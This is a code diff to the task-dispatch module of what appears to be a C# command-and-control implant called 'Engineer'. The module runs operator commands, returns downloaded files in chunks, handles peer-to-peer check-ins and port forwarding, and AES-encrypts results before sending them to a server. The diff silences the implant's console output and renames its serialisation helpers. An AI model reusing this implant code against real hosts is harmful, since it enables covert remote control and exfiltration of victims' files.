@@ -36,8 +36,8 @@ namespace Engineer.Functions
             }
             catch (Exception e)
             {
-                Console.WriteLine(e.Message);
-                Console.WriteLine(e.StackTrace);
+                //Console.WriteLine(e.Message);
+                //Console.WriteLine(e.StackTrace);
             }
         }
 
@@ -53,7 +53,7 @@ namespace Engineer.Functions
                 {
                     Id = task.Id,
                     Command = task.Command,
-                    Result = "".Serialise(),
+                    Result = "".JsonSerialize(),
                     IsHidden = false,
                     Status = EngTaskStatus.Running,
                     ResponseType = TaskResponseType.None,
@@ -64,7 +64,7 @@ namespace Engineer.Functions
                 if (command is null)
                 {
                     var result = "Error: Command not found";
-                    taskResult.Result = result.Serialise();
+                    taskResult.Result = result.JsonSerialize();
                     taskResult.Command = task.Command;
                     taskResult.Status = EngTaskStatus.Failed;
                     taskResult.ResponseType = TaskResponseType.String;
@@ -79,8 +79,8 @@ namespace Engineer.Functions
             }
             catch (Exception ex)
             {
-                Console.WriteLine(ex.Message);
-                Console.WriteLine(ex.StackTrace);
+                //Console.WriteLine(ex.Message);
+                //Console.WriteLine(ex.StackTrace);
             }  
         }
 
@@ -100,11 +100,11 @@ namespace Engineer.Functions
                 {
                     if(TaskResponseType.String == taskResponseType)
                     {
-                        engTaskResultDic[task.Id].Result = (output as string).Serialise();
+                        engTaskResultDic[task.Id].Result = (output as string).JsonSerialize();
                     }
                     else if(TaskResponseType.FileSystemItem == taskResponseType)
                     {
-                        engTaskResultDic[task.Id].Result = (output as List<FileSystemItem>).Serialise();
+                        engTaskResultDic[task.Id].Result = (output as List<FileSystemItem>).JsonSerialize();
                     }
                     else if(TaskResponseType.ProcessItem == taskResponseType)
                     {
@@ -112,7 +112,7 @@ namespace Engineer.Functions
                     }
                     else
                     {
-                        engTaskResultDic[task.Id].Result = (output as string).Serialise();
+                        engTaskResultDic[task.Id].Result = (output as string).JsonSerialize();
                     }
                     engTaskResultDic[task.Id].Status = taskStatus;
                     engTaskResultDic[task.Id].ResponseType = taskResponseType;
@@ -123,11 +123,11 @@ namespace Engineer.Functions
                     if (engTaskResultDic[task.Id].Status == EngTaskStatus.Complete)
                     {
                         task.Arguments.TryGetValue("/file", out string filename);
-                        Functions.DownloadTracker.SplitFileString(filename, engTaskResultDic[task.Id].Result.Deserialize<string>());
+                        Functions.DownloadTracker.SplitFileString(filename, engTaskResultDic[task.Id].Result.JsonDeserialize<string>());
                         //send each value from the key that matches the filename variable in _downloadedFileParts to the server
                         foreach (var value in Functions.DownloadTracker._downloadedFileParts[filename])
                         {
-                            engTaskResultDic[task.Id].Result = value.Serialise();
+                            engTaskResultDic[task.Id].Result = value.JsonSerialize();
                             SendTaskResult(engTaskResultDic[task.Id]);
                         }
                     }
@@ -144,7 +144,7 @@ namespace Engineer.Functions
                 }
                 else if (task.Command.Equals("P2PFirstTimeCheckIn", StringComparison.CurrentCultureIgnoreCase))
                 {
-                    Console.WriteLine($"first check in task {task.Id} complete");
+                    //Console.WriteLine($"first check in task {task.Id} complete");
                     engTaskResultDic[task.Id].IsHidden = true;
                     SendTaskResult(engTaskResultDic[task.Id]);
                     //Program.SendTaskResult(task.Id, result, true, EngTaskStatus.Complete);
@@ -158,7 +158,7 @@ namespace Engineer.Functions
                 }
                 else if (task.Command.Equals("rportsend", StringComparison.CurrentCultureIgnoreCase) || task.Command.Equals("rportRecieve", StringComparison.CurrentCultureIgnoreCase) || task.Command.Equals("rportforward", StringComparison.CurrentCultureIgnoreCase))
                 {
-                    Console.WriteLine($"task {task.Id} complete");
+                    //Console.WriteLine($"task {task.Id} complete");
                     engTaskResultDic[task.Id].IsHidden = true;
                     SendTaskResult(engTaskResultDic[task.Id]);
                     //Program.SendTaskResult(task.Id, result, true, EngTaskStatus.Complete);
@@ -190,8 +190,8 @@ namespace Engineer.Functions
                 }
             catch (Exception e)
             {
-                Console.WriteLine(e.Message);
-                Console.WriteLine(e.StackTrace);
+                //Console.WriteLine(e.Message);
+               // Console.WriteLine(e.StackTrace);
             }
         }
         
@@ -219,9 +219,9 @@ namespace Engineer.Functions
                     Program.OutboundResponsesSent += 1;
                     //Console.WriteLine("is tcp seralizing task result");
                     IEnumerable<EngineerTaskResult> tempResult = new List<EngineerTaskResult> { NewtaskResult };
-                    var SeraliedTaskResult = tempResult.ProSerialise();
+                    var SeraliedTaskResult = tempResult.JsonSerialize();
                     var encryptedTaskResult = Encryption.AES_Encrypt(SeraliedTaskResult, Program.UniqueTaskKey);
-                    Console.WriteLine($"{DateTime.UtcNow} calling p2p Sent");
+                    //Console.WriteLine($"{DateTime.UtcNow} calling p2p Sent");
                     Task.Run(async() => await Program._commModule.P2PSent(encryptedTaskResult));
                 }
             
@@ -229,17 +229,17 @@ namespace Engineer.Functions
                 {
                     Program.OutboundResponsesSent += 1;
                     IEnumerable<EngineerTaskResult> tempResult = new List<EngineerTaskResult> { NewtaskResult };
-                    var SeraliedTaskResult = tempResult.ProSerialise();
+                    var SeraliedTaskResult = tempResult.JsonSerialize();
                     var encryptedTaskResult = Encryption.AES_Encrypt(SeraliedTaskResult, Program.UniqueTaskKey);
-                    Console.WriteLine($"{DateTime.UtcNow} calling p2p Sent");
+                   //Console.WriteLine($"{DateTime.UtcNow} calling p2p Sent");
                     Task.Run(async () => await Program._commModule.P2PSent(encryptedTaskResult));
                 }
 
             }
             catch (Exception e)
             {
-                Console.WriteLine(e.Message);
-                Console.WriteLine(e.StackTrace);
+               // Console.WriteLine(e.Message);
+                //Console.WriteLine(e.StackTrace);
             }
         }
     }
